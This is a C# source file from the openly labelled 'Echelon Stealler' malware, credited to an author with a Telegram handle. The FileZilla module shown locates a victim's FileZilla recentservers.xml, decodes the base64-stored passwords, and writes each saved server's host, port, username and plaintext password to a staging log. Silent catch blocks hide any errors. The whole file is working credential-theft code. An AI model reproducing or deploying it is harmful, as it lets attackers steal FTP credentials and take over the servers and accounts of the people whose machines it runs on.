///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Echelon
{
    class FileZilla
    {
        public static int count = 0;
        private static StringBuilder SB = new StringBuilder();
        public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");

        public static void Start(string Echelon_Dir)
        {
            if (File.Exists(FzPath))
            {
                Directory.CreateDirectory(Echelon_Dir + "\\FileZilla");
                GetDataFileZilla(FzPath, Echelon_Dir + "\\FileZilla" + "\\FileZilla.log");
                
            }
            else {return;}
        }
        public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
        {
            try
            {
                if (File.Exists(PathFZ))
                {

                    try
                    {
                        var xf = new XmlDocument();
                        xf.Load(PathFZ);
                        foreach (XmlElement XE in ((XmlElement)xf.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
                        {
                            var Host = XE.GetElementsByTagName("Host")[0].InnerText;
                            var Port = XE.GetElementsByTagName("Port")[0].InnerText;
                            var User = XE.GetElementsByTagName("User")[0].InnerText;
                            var Pass = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName("Pass")[0].InnerText)));
                            if (!string.IsNullOrEmpty(Host) && !string.IsNullOrEmpty(Port) && !string.IsNullOrEmpty(User) && !string.IsNullOrEmpty(Pass))
                            {
                                SB.AppendLine($"Host: {Host}");
                                SB.AppendLine($"Port: {Port}");
                                SB.AppendLine($"User: {User}");
                                SB.AppendLine($"Pass: {Pass}\r\n");
                                count++;
                            }
                            else
                            {
                                break;
                            }
                        }
                        if (SB.Length > 0)
                        {
                            try
                            {
                                File.AppendAllText(SaveFile, SB.ToString());
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}

